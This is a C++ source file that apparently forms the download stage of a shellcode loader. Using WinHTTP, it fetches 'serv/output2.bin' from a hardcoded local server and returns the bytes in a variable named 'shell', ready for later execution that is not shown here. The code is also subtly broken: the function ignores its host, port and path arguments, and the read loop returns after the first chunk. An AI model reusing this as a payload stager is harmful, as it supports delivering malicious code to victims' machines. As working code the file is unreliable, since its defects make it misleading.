#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "utils.h"
#include <iostream>
#include "Http.h"

#pragma comment(lib, "winhttp.lib")

HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
BOOL bResults = FALSE;

LPSTR CheckData(HINTERNET hRequest) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = nullptr; // Initialize to avoid unreferenced warning.

    do {
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
            std::cout << "Error " << GetLastError() << " in WinHttpQueryDataAvailable.\n";
            break;
        }

        pszOutBuffer = (char*)LocalAlloc(LPTR, dwSize + 1); // Allocate memory.
        if (!pszOutBuffer) {
            std::cout << "Out of memory\n";
            break;
        }

        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
            std::cout << "Error " << GetLastError() << " in WinHttpReadData.\n";
            LocalFree(pszOutBuffer);
            pszOutBuffer = nullptr; // Avoid returning invalid memory.
        }

        // Return the buffer if successful.
        return pszOutBuffer;

    } while (dwSize > 0);

    return nullptr; // Ensure it returns something in all cases.
}

LPSTR Data(const wchar_t host[], int port, const wchar_t path[]) {

    hSession = Open();

    if (hSession)
        hConnect = Connect(hSession, L"127.0.0.1", 1234);

    if (hConnect)
        hRequest = OpenRequest(hConnect, L"serv/output2.bin");

    // Send a request
    if (hRequest)
        bResults = SendRequest(hRequest);

    // Receive the response
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left
    LPSTR shell = CheckData(hRequest);
    //printf("%s \n \n", shell);

    // Close handles
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (!bResults) std::cout << "Error " << GetLastError() << " has occurred.\n";


    return shell;
}

